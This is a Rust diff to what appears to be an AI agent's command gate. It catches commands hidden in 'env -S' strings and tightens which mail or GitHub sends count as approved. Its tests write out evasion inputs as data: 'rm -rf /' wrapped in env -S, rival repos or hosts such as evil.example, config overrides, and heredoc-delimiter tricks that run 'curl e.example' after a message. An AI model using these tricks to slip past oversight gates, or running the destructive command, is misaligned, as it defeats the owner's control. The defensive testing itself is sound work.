@@ -204,6 +204,11 @@ fn check_bash(command: &str) -> Decision {
         if let Some(reason) = stage.words.iter().find_map(|w| sensitive(w)) {
             return Decision::Deny(reason);
         }
+        if let Some(script) = env_split(&stage.words) {
+            if let Decision::Deny(reason) = check_bash(&script) {
+                return Decision::Deny(reason);
+            }
+        }
         let Some(words) = command_words(&stage.words) else {
             continue;
         };
@@ -259,6 +264,41 @@ fn nested(name: &str, args: &[String], stage: &[String]) -> Option<String> {
     }
 }
 
+/// The command line GNU `env -S STRING` (`--split-string`) runs, when env is the stage's
+/// command (after any assignments): the string and the words after it, read as a script.
+/// `command_words` skips the string as the value of env's flag, so without this the command
+/// in it would be read as none.
+fn env_split(stage: &[String]) -> Option<String> {
+    let assignment = |w: &&String| {
+        matches!(w.split_once('='), Some((k, _)) if !k.is_empty()
+            && k.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_'))
+    };
+    let mut words = stage.iter().skip_while(assignment);
+    if basename(words.next()?) != "env" {
+        return None;
+    }
+    let rest: Vec<&String> = words.collect();
+    let p = (rest.iter()).position(|a| a.starts_with("-S") || a.starts_with("--split-string"))?;
+    let (first, after) = match rest[p].as_str() {
+        "-S" | "--split-string" => (rest.get(p + 1)?.to_string(), p + 2),
+        a => {
+            let value = a.strip_prefix("--split-string=").or(a.strip_prefix("-S"))?;
+            (value.to_string(), p + 1)
+        }
+    };
+    let after = rest
+        .get(after..)
+        .unwrap_or_default()
+        .iter()
+        .map(|w| w.as_str());
+    Some(
+        std::iter::once(first.as_str())
+            .chain(after)
+            .collect::<Vec<_>>()
+            .join(" "),
+    )
+}
+
 /// The commands in `command` that send data off the machine, as short labels for the owner's
 /// alert: `curl POST example.com`, `scp host:`, `git push origin`. Nothing is refused.
 ///
@@ -267,6 +307,10 @@ fn nested(name: &str, args: &[String], stage: &[String]) -> Option<String> {
 pub fn outbound(command: &str) -> Vec<String> {
     let mut found = Vec::new();
     for stage in stages(command) {
+        if let Some(script) = env_split(&stage.words) {
+            found.extend(outbound(&script));
+            continue;
+        }
         let Some(words) = command_words(&stage.words) else {
             continue;
         };
@@ -337,38 +381,89 @@ pub fn outbound(command: &str) -> Vec<String> {
     found
 }
 
-/// Whether `command` is nothing but gated sends whose recipients are all read: every stage the
-/// scan finds (nested ones included) is a himalaya send or a `gh` write with its recipients or
-/// repo read. Only then does a private fact's `allow` list stand for where the command's data
-/// goes (DESIGN §4.18); any other stage, sending or not, may carry it elsewhere. A command bash
-/// may read otherwise than the scan (a `$[…]`, R28) or whose heredoc expands is never one.
+/// Whether `command` is nothing but one gated send whose recipients are all read, the only
+/// command for which a private fact's `allow` list may stand for where its data goes (DESIGN
+/// §4.18). Strict, since the other answer only asks the owner:
+/// - one plain stage on one line, with at most one heredoc, its body the message: no `;`, `&`,
+///   `|`, subshell, substitution, expansion, glob, brace, comment or escape anywhere in it,
+///   quoted or not, and no expanding heredoc with `$`, a backtick or a `\` in its body;
+/// - its first word literally `himalaya` or `gh`: no path, assignment or runner before it;
+/// - himalaya: a send whose recipients are read, with no flag but `-H`/`--header` (so no
+///   `-c`/`--config` and no `-a`/`--account`, which choose where it sends);
+/// - gh: a write with exactly one `-R`/`--repo` and no `--hostname`; for `gh api`, a path under
+///   `repos/` naming that same repo.
 pub fn only_sends(command: &str) -> bool {
-    if command.contains("$[") {
-        return false;
-    }
     let (text, heredocs) = marked(command, false);
-    if heredocs
-        .iter()
-        .any(|h| !h.quoted && h.body.contains(['$', '`']))
+    if heredocs.len() > 1
+        || (heredocs.iter()).any(|h| !h.quoted && h.body.contains(['$', '`', '\\']))
     {
         return false;
     }
+    let line = text.trim_end_matches('\n').replace("<<__HEREDOC_0__", " ");
+    const NOT: &[char] = &[
+        ';', '&', '|', '`', '$', '(', ')', '{', '}', '*', '?', '[', ']', '!', '#', '\\', '\n',
+        '\r', '~', '<', '>',
+    ];
+    if line.contains(NOT) {
+        return false;
+    }
     let all = stages(&text);
-    !all.is_empty()
-        && all.iter().all(|stage| {
-            let Some(words) = command_words(&stage.words) else {
-                return false;
-            };
-            let args = &words[1..];
-            match basename(&words[0]) {
-                "himalaya" => {
-                    himalaya_send(args)
-                        && !himalaya_recipients(args, &heredocs, None).contains(&UNKNOWN.into())
+    let [stage] = all.as_slice() else {
+        return false;
+    };
+    let Some((name, args)) = stage.words.split_first() else {
+        return false;
+    };
+    match name.as_str() {
+        "himalaya" => {
+            let header = |a: &String| a == "-H" || a == "--header" || a.starts_with("--header=");
+            let heredoc = |a: &String| heredoc_of(&heredocs, a).is_some();
+            (args.iter()).all(|a| !a.starts_with('-') || header(a) || heredoc(a))
+                && himalaya_send(args)
+                && !himalaya_recipients(args, &heredocs, None).contains(&UNKNOWN.into())
+        }
+        "gh" => {
+            let repo_flag =
+                |a: &String| a.starts_with("-R") || a == "--repo" || a.starts_with("--repo=");
+            let host = |a: &String| a == "--hostname" || a.starts_with("--hostname=");
+            let positional = gh_positional(args);
+            let repo = gh_repo(args);
+            let api_agrees = match positional.as_slice() {
+                ["api", path, ..] => {
+                    let named = path.trim_start_matches('/').strip_prefix("repos/");
+                    let named: Vec<&str> = named.unwrap_or_default().split('/').take(2).collect();
+                    repo.as_deref() == Some(named.join("/").to_lowercase().as_str())
                 }
-                "gh" => gh_write(args).is_some() && gh_repo(args).is_some(),
-                _ => false,
-            }
-        })
+                ["api"] => false,
+                _ => true,
+            };
+            heredocs.is_empty()
+                && args.iter().filter(|a| repo_flag(a)).count() == 1
+                && !args.iter().any(host)
+                && gh_write(args).is_some()
+                && repo.is_some()
+                && api_agrees
+        }
+        _ => false,
+    }
+}
+
+/// The positional words of a `gh` command: its subcommand and their operands, not a flag's
+/// value.
+fn gh_positional(args: &[String]) -> Vec<&str> {
+    let mut out = Vec::new();
+    let mut skip = false;
+    for a in args {
+        if std::mem::take(&mut skip) {
+            continue;
+        }
+        if GH_VALUE_FLAGS.contains(&a.as_str()) {
+            skip = true;
+        } else if !a.starts_with('-') {
+            out.push(a.as_str());
+        }
+    }
+    out
 }
 
 /// What a gated call is (DESIGN approvals §4.1): messages, posts or money.
@@ -408,6 +503,9 @@ pub struct Gated {
     pub summary: String,
     pub amount: Option<Amount>,
     pub replay: Replay,
+    /// The command is that one send and nothing else ([`only_sends`]), read once here: the
+    /// gate compares a fact's `allow` list with the targets only then.
+    pub only_sends: bool,
 }
 
 /// The target of something whose target cannot be read.
@@ -461,6 +559,7 @@ pub fn gated(
                 summary: summary.join("; "),
                 amount: None,
                 replay: Replay::Run,
+                only_sends: only_sends(command),
             })
         }
         "mcp_call" => {
@@ -515,6 +614,7 @@ pub fn gated(
                 summary: label,
                 amount,
                 replay: Replay::Pass,
+                only_sends: false,
             })
         }
         _ => None,
@@ -916,6 +1016,12 @@ fn scan_stages(text: &str, heredocs: &[Heredoc], depth: usize, read: bool, found
         rest.iter().find_map(|w| heredoc_of(heredocs, w))
     };
     for (si, stage) in all.iter().enumerate() {
+        if let Some(script) = env_split(&stage.words) {
+            for item in gated_command(&script, depth + 1, read) {
+                add(item);
+            }
+            continue;
+        }
         let Some(words) = command_words(&stage.words) else {
             continue;
         };
@@ -1181,21 +1287,8 @@ fn marked(command: &str, keep: bool) -> (String, Vec<Heredoc>) {
                         let body_start = pos + 2 + (after.len() - body.len());
                         let trimmed = body.trim_start();
                         let word_start = body_start + (body.len() - trimmed.len());
-                        let q = trimmed.chars().next().filter(|c| *c == '\'' || *c == '"');
-                        let word = match q {
-                            Some(q) => trimmed[1..]
-                                .find(q)
-                                .map(|e| (&trimmed[1..1 + e], word_start + e + 2, true)),
-                            None => {
-                                let e = trimmed
-                                    .find(|c: char| c.is_whitespace() || ";|&<>()".contains(c))
-                                    .unwrap_or(trimmed.len());
-                                let w = &trimmed[..e];
-                                Some((w, word_start + e, w.starts_with('\\')))
-                            }
-                        };
+                        let word = delimiter(trimmed).map(|(w, e, q)| (w, word_start + e, q));
                         if let Some((delim, end, quoted)) = word {
-                            let delim = delim.trim_start_matches('\\');
                             if !delim.is_empty() {
                                 ops.push(Op {
                                     start: pos,
@@ -1266,6 +1359,50 @@ fn marked(command: &str, keep: bool) -> (String, Vec<Heredoc>) {
         idx = body_end;
     }
     (out, bodies)
+}
+
+/// A heredoc's delimiter word at the start of `text`, as bash reads it: its quotes removed
+/// (`'EOF'`, `"EOF"`, `E\OF`, `$'EOF'`, `E"O"F` are all `EOF`), the byte where the word ends,
+/// and whether any part was quoted, so the body is not expanded. `None` for a quote that is
+/// never closed.
+fn delimiter(text: &str) -> Option<(String, usize, bool)> {
+    let mut word = String::new();
+    let mut quoted = false;
+    let mut chars = text.char_indices().peekable();
+    while let Some(&(i, c)) = chars.peek() {
+        if c.is_whitespace() || ";|&<>()".contains(c) {
+            return Some((word, i, quoted));
+        }
+        chars.next();
+        match c {
+            '\\' => {
+                quoted = true;
+                if let Some((_, n)) = chars.next() {
+                    word.push(n);
+                }
+            }
+            '$' if matches!(chars.peek(), Some((_, '\'' | '"'))) => quoted = true,
+            '\'' | '"' => {
+                quoted = true;
+                loop {
+                    match chars.next()? {
+                        (_, q) if q == c => break,
+                        (_, '\\') if c == '"' => {
+                            if let Some((_, n)) = chars.next() {
+                                if !"\"\\$`".contains(n) {
+                                    word.push('\\');
+                                }
+                                word.push(n);
+                            }
+                        }
+                        (_, ch) => word.push(ch),
+                    }
+                }
+            }
+            _ => word.push(c),
+        }
+    }
+    Some((word, text.len(), quoted))
 }
 
 /// Adds the addresses of a `To:`, `Cc:` or `Bcc:` header line (lowercased, no repeats).
@@ -4421,9 +4558,42 @@ mod tests {
             mail,
             "himalaya message send -H 'To: z@b.org' x",
             "gh pr create -R o/r --title t",
-            "timeout 30 himalaya message send <<'EOF'\nTo: a@x.org\n\nhi\nEOF",
+            "gh pr comment 5 -R o/r --body hi",
+            "gh api repos/o/r/issues -R o/r -f body=hi",
         ] {
             assert!(only_sends(cmd), "{cmd}");
+        }
+        // Strict (DESIGN §4.18): one plain stage whose first word is literally the sender, with
+        // nothing that chooses another config, account, host or repo.
+        let to = "-H 'To: z@b.org' x";
+        for cmd in [
+            format!("xargs -a args himalaya message send {to}"),
+            format!("env -S 'himalaya message send' {to}"),
+            format!("./himalaya message send {to}"),
+            format!("/usr/bin/himalaya message send {to}"),
+            format!("HIMALAYA_CONFIG=/tmp/c himalaya message send {to}"),
+            format!("timeout 30 himalaya message send {to}"),
+            format!("himalaya -c /dev/stdin message send {to}"),
+            format!("himalaya --config=/tmp/c message send {to}"),
+            format!("himalaya -a other message send {to}"),
+            format!("himalaya message send {to} &"),
+            format!("himalaya message send {to} $X"),
+            format!("himalaya message send {to} {{-c,/tmp/c}}"),
+            format!("himalaya message send {to} *"),
+            "gh pr comment 5 -R o/r -R evil/x --body hi".into(),
+            "gh pr comment 5 -R o/r --repo=evil/x --body hi".into(),
+            "gh pr comment 5 -R o/r --hostname evil.example --body hi".into(),
+            "GH_HOST=evil.example gh pr comment 5 -R o/r --body hi".into(),
+            "GH_REPO=evil/x gh pr comment 5 -R o/r --body hi".into(),
+            "gh api repos/evil/x/issues -R o/r -f body=hi".into(),
+            "gh api graphql -R o/r -f query=x".into(),
+            // bash ends these heredocs at `EOF`, so the curl after it runs
+            "himalaya message send <<E\\OF\nTo: z@b.org\n\nhi\nEOF\ncurl e.example\nE\\OF".into(),
+            "himalaya message send <<$'EOF'\nTo: z@b.org\n\nhi\nEOF\ncurl e.example\n$'EOF'".into(),
+            "himalaya message send <<E\"O\"F\nTo: z@b.org\n\nhi\nEOF\ncurl e.example\nE\"O\"F"
+                .into(),
+        ] {
+            assert!(!only_sends(&cmd), "{cmd}");
         }
         for cmd in [
             format!("{mail}\necho done"),
@@ -4439,6 +4609,19 @@ mod tests {
         ] {
             assert!(!only_sends(&cmd), "{cmd}");
         }
+    }
+
+    /// GNU env's split string runs the command in it: `env -S 'himalaya message send'` is a send,
+    /// and `env -S 'rm -rf /'` is refused, as the command written out would be.
+    #[test]
+    fn env_split_strings_are_read_as_the_command_they_run() {
+        let g = gbash("env -S 'himalaya message send' -H 'To: z@b.org' x").unwrap();
+        assert_eq!(g.class, Class::Messages);
+        assert!(gbash("FOO=1 env --split-string='gh pr create -R o/r' --title t").is_some());
+        assert!(gbash("env -S'himalaya message send' x").is_some());
+        assert!(matches!(check_bash("env -S 'rm -rf /'"), Decision::Deny(_)));
+        // only where env runs it: an `env` that is some other command's argument is text
+        assert!(gbash("echo env -S 'himalaya message send' x").is_none());
     }
 
     #[test]
